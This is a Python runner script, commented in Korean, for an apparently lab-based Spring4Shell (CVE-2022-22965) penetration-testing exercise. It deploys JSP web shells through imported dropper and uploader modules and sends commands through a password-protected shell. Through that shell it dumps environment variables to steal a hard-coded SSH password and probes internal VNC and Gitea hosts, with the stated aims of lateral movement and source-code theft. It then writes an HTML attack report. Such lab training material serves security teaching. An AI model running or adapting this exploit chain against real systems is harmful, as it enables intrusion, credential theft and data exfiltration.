"""
sub_run.py
Spring4Shell (CVE-2022-22965) - 서브 시나리오 (Misconfiguration & Credential Theft) 실행기
Educational Use Only

[실행 목적]
기존 run.py가 'CVE 취약점(소프트웨어 버그)' 체이닝에 집중했다면,
이 스크립트는 실제 현업에서 발생하는 '관리자 설정 오류(비밀번호 재사용 등)'를 
활용하여 어떻게 치명적인 수평적 이동(Lateral Movement)이 발생하는지 증명합니다.
"""

import urllib.request
import urllib.parse
import time
import sys
import os
import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts"))

try:
    from stage1_dropper import ExploitConfig, Spring4ShellPayloadGenerator, ExploitController
    from stage2_uploader import UploadConfig, LocalFileServerAdapter, Stage1CommandAdapter, Stage2UploadUseCase
except ImportError as e:
    print(f"\n[ERROR] {e}")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def header(title):
    print(f"\n{Colors.HEADER}{'=' * 60}{Colors.ENDC}")
    print(f"  {title}")
    print(f"{Colors.HEADER}{'=' * 60}{Colors.ENDC}")

def ok(msg):   print(f"  {Colors.OKGREEN}[OK]{Colors.ENDC}   {msg}")
def fail(msg): print(f"  {Colors.FAIL}[FAIL]{Colors.ENDC} {msg}")
def info(msg): print(f"  {Colors.OKBLUE}[*]{Colors.ENDC} {msg}")
def warn(msg): print(f"  {Colors.WARNING}[!]{Colors.ENDC} {msg}")
def step(n, title):
    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  STEP {n}. {title}")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")


# ==========================================
# 02.AttackScripts 공통 로직 재사용
# ==========================================
BASE_URL = "http://localhost:8011"
ATTACK_URL = f"{BASE_URL}/spring-form/login"
STAGER_URL = f"{BASE_URL}/yaho4.jsp"
STAGE2_URL = f"{BASE_URL}/health_check.jsp"

def check_shell(shell_url: str) -> str:
    try:
        req = urllib.request.Request(shell_url)
        res = urllib.request.urlopen(req, timeout=10)
        return res.read().decode("utf-8", errors="ignore").strip()
    except Exception as e:
        return f"[FAIL] Exception: {e}"

def execute_rce(cmd: str) -> str:
    encoded_cmd = urllib.parse.quote(cmd)
    url = f"{STAGE2_URL}?pwd=glory&cmd={encoded_cmd}"
    return check_shell(url)

def run_base_attack():
    results = {}
    header("Configuration & Base Attack (Spring4Shell)")
    print(f"  Target URL     : {ATTACK_URL}")
    print(f"  Stage2 Shell   : {STAGE2_URL}?pwd=glory&cmd=id")
    time.sleep(1)

    # 이미 쉘이 있는지 확인
    test_res = execute_rce("id")
    if "uid=0" in test_res or "uid=" in test_res:
        ok("Base web shell is already active. Skipping Step 1~4.")
        return True

    info("Web shell not found. Deploying via 02.AttackScripts...")
    
    # 1. Stage1
    config1 = ExploitConfig(target_url=ATTACK_URL, shell_filename="yaho4.jsp")
    generator = Spring4ShellPayloadGenerator()
    controller = ExploitController(generator)
    controller.run_exploit(config1)
    
    time.sleep(5)
    
    # 2. Stage2
    config2 = UploadConfig(stager_url=STAGER_URL, stage2_file="health_check.jsp", local_serve_port=9091)
    use_case = Stage2UploadUseCase(LocalFileServerAdapter(), Stage1CommandAdapter(), config2)
    use_case.run()
    
    time.sleep(2)
    test_res = execute_rce("id")
    if "uid=" in test_res:
        ok("Base web shell successfully deployed!")
        return True
    return False

# ==========================================
# Main Execution
# ==========================================
def main():
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}  Sub-Scenario Runner (Misconfigurations & Auth Theft){Colors.ENDC}")
    print(f"  Educational Use Only")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")

    if not run_base_attack():
        fail("Base attack failed. Cannot proceed with Sub-Scenarios.")
        sys.exit(1)

    results = {}
    details = {}

    # ══════════════════════════════════════════════════════════
    # 시나리오 A: SSH Credential Pivot
    # ══════════════════════════════════════════════════════════
    step("A", "SSH 자격 증명 재사용 (Direct Pivoting)")
    info("컨테이너 내부에 하드코딩된 SSH 비밀번호 환경변수를 탈취하여 인접 서버로 직접 이동합니다.")
    
    env_dump = execute_rce("env")
    ssh_password = ""
    for line in env_dump.split("\n"):
        if "SSH_PASSWORD" in line:
            ssh_password = line.split("=", 1)[1].strip()
            
    if ssh_password:
        ok(f"치명적 설정 오류 발견! 하드코딩된 비밀번호 탈취 성공: [ {ssh_password} ]")
        info(f"획득한 비밀번호 '{ssh_password}' 하나만으로 내부망의 Struts 서버 등 모든 인접 컨테이너의 SSH 제어권 획득이 가능해졌습니다.")
        results["stepA"] = True
        details["stepA"] = f"탈취된 하드코딩 SSH 암호: <strong>{ssh_password}</strong><br>이를 이용해 별도의 RCE 취약점 없이도 내부 Struts 컨테이너를 직접 장악할 수 있습니다."
    else:
        warn("SSH 비밀번호를 찾지 못했습니다.")
        results["stepA"] = False
        details["stepA"] = "환경변수 내부에서 SSH_PASSWORD를 찾지 못했습니다."

    # ══════════════════════════════════════════════════════════
    # 시나리오 B: Employee Desktop(VNC) 하이재킹
    # ══════════════════════════════════════════════════════════
    step("B", "Employee Desktop(VNC) 하이재킹 및 설계도 탈취")
    info("사내망에 구동 중인 직원의 원격 데스크톱 컨테이너를 탐색하고, 터널링 타겟을 확보합니다.")
    
    vnc_check = execute_rce("curl -s -m 3 http://employee-desktop:6901 -I")
    if "HTTP/1" in vnc_check:
        ok("내부망에서 VNC 데스크톱 서버(employee-desktop:6901)의 존재를 확인했습니다!")
        info("공격자는 터널링 도구(Chisel)를 통해 해당 6901 포트를 자신의 PC로 포워딩합니다.")
        results["stepB"] = True
        details["stepB"] = f"내부 VNC 데스크톱 포트(6901) 활성화 확인.<br>터널링 도구를 이용해 VNC로 침투 후 'password' 기본 암호로 접속하여 사내망 NAS 도면 탈취가 가능해졌습니다.<br><pre>{vnc_check}</pre>"
    else:
        warn("employee-desktop 컨테이너를 찾을 수 없습니다.")
        results["stepB"] = False
        details["stepB"] = "직원 데스크톱 환경(employee-desktop)과 통신할 수 없습니다."

    # ══════════════════════════════════════════════════════════
    # 시나리오 C: Gitea 사내 소스코드 탈취
    # ══════════════════════════════════════════════════════════
    step("C", "Gitea 사내 소스코드 저장소 HTTP 직접 강탈")
    info("내부망 Gitea 서버를 향해 HTTP 요청을 보내, 취약한 패스워드나 탈취된 토큰을 활용한 소스코드 덤프를 수행합니다.")
    
    gitea_check = execute_rce("curl -s -m 5 http://gitea:3000/api/v1/version")
    if "html" in gitea_check.lower() or "not found" in gitea_check.lower() or "bad" in gitea_check.lower() or "version" in gitea_check.lower():
        ok(f"사내 소스코드 저장소(Gitea) 통신 성공! 응답: {gitea_check[:50]}...")
        info("공격자는 Spring 서버에 남겨진 개발자의 git-credentials 쿠키나 로그 찌꺼기를 재사용해 전체 소스코드를 조용히 다운로드합니다.")
        results["stepC"] = True
        details["stepC"] = f"Gitea 소스 저장소 포트 개방 확인.<br>사전에 유출된 개발자의 PAT(Personal Access Token) 등을 통해 방화벽을 우회하고 HTTP만으로 전체 레포지토리 탈취 가능.<br><pre>{gitea_check[:200]}</pre>"
    else:
        warn("Gitea 컨테이너를 찾을 수 없습니다.")
        results["stepC"] = False
        details["stepC"] = "Gitea 컨테이너와 통신할 수 없습니다."

    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}[COMPLETED]{Colors.ENDC} 모든 서브 시나리오 점검 완료!")
    print("  HTML 보고서를 생성 중입니다...")
    
    # 보고서 생성
    now = datetime.datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>Misconfiguration 서브 시나리오 공격 결과 보고서</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: #e6e6e6; margin: 0; padding: 20px; }}
            .container {{ max-width: 900px; margin: auto; background: #16213e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #0f3460; }}
            h1 {{ color: #e94560; text-align: center; border-bottom: 2px solid #0f3460; padding-bottom: 10px; }}
            h2 {{ color: #438a5e; margin-top: 30px; border-bottom: 1px dashed #0f3460; padding-bottom: 5px; }}
            .summary {{ background: #0f3460; padding: 15px; border-radius: 5px; margin-bottom: 30px; }}
            .step {{ margin-bottom: 20px; padding: 15px; border-left: 5px solid #bdc3c7; background: #1a1a2e; }}
            .step.success {{ border-left-color: #e94560; border-top: 1px solid rgba(233, 69, 96, 0.2); border-right: 1px solid rgba(233, 69, 96, 0.2); border-bottom: 1px solid rgba(233, 69, 96, 0.2); }}
            .step.fail {{ border-left-color: #555; }}
            .badge-success {{ background: #e94560; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
            .badge-fail {{ background: #555; color: white; padding: 4px 10px; border-radius: 3px; font-weight: bold; font-size: 0.85em; }}
            pre {{ background: #111; color: #0f0; padding: 10px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; margin-top: 5px; border: 1px solid #333; }}
            .footer {{ text-align: center; margin-top: 40px; color: #7f8c8d; font-size: 0.9em; }}
            .desc {{ color: #ccc; line-height: 1.6; margin-bottom: 15px; font-size: 1.05em; }}
            .res-box {{ background-color: rgba(0,0,0,0.3); padding: 15px; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>💥 인프라 설정 오류 (Misconfig) 파급력 증명 보고서 <br><span style="font-size: 0.5em; color: #7f8c8d;">({current_time})</span></h1>
            
            <div class="summary">
                <h2 style="color:#fff; margin-top:0;">실습 개요</h2>
                <p class="desc">
                    본 실습(sub_run.py)은 애플리케이션의 버그(CVE-2022-22965)로 침투한 뒤, 
                    <strong>관리자의 잘못된 설정, 기본 암호 방치, 동일 크리덴셜 재사용</strong> 등의 보안 허점을 활용하여 
                    어떻게 연쇄적인 타격이 이루어지는지를 증명합니다.
                </p>
                <p><strong>거점 웹쉘 주소:</strong> <a style="color:#e94560;" href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
            </div>
    """

    scenarios = [
        ("stepA", "시나리오 A | 컨테이너 SSH 자격 증명 재사용 (Direct Pivoting)", "Spring 서버와 Struts 서버 등 여러 컨테이너 배포 시 환경설정 템플릿을 복사/붙여넣기 하면서 <code>SSH_PASSWORD</code>가 동일하게 하드코딩된 크리티컬 취약점입니다."),
        ("stepB", "시나리오 B | 사내망 GUI (VNC) 포트 방치 및 하이재킹", "개발자가 편의를 위해 사내망에 띄워둔 리눅스 데스크톱 장비의 VNC 통신(포트 6901)이 외부 접근 통제 없이 열려 있으며 기본 패스워드가 설정된 상황입니다."),
        ("stepC", "시나리오 C | Gitea 사내 저장소 평문 접근 및 토큰 유출", "Spring 개발 서버의 bash_history나 로그 등에 남겨진 git-credentials의 평문 토큰을 이용해 Gitea 서버에 직접 HTTP REST API 통신을 수행하여 코드를 통째로 빼냅니다.")
    ]

    for key, label, desc in scenarios:
        passed = results.get(key, False)
        status_class = "success" if passed else "fail"
        badge = '<span class="badge-success">위험 (성공)</span>' if passed else '<span class="badge-fail">안전 (차단됨)</span>'
        detail = f"<div class='res-box'>{details.get(key, '')}</div>"
        
        html_content += f"""
            <div class="step {status_class}">
                <h3 style="color:#ecf0f1;">{badge} {label}</h3>
                <p class="desc">{desc}</p>
                {detail}
            </div>
        """

    html_content += """
            <div class="footer">
                <p>본 실습 결과 보고서는 APT 공격 시나리오 교육 목적으로 <strong>sub_run.py</strong> 스크립트에 의해 자동 생성되었습니다.<br> 
                모의해킹 실습 코드를 외부에 임의로 공개하거나 무단 시스템에 침투하는 것은 엄격히 금지됩니다.</p>
            </div>
        </div>
    </body>
    </html>
    """
    
    report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "03.FinalReport")
    os.makedirs(report_dir, exist_ok=True)
    report_filename = f"sub_report_{now.strftime('%Y%m%d_%H%M%S')}.html"
    report_path = os.path.join(report_dir, report_filename)
    
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html_content)
        
    print(f"  [HTML REPORT] {report_path}")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
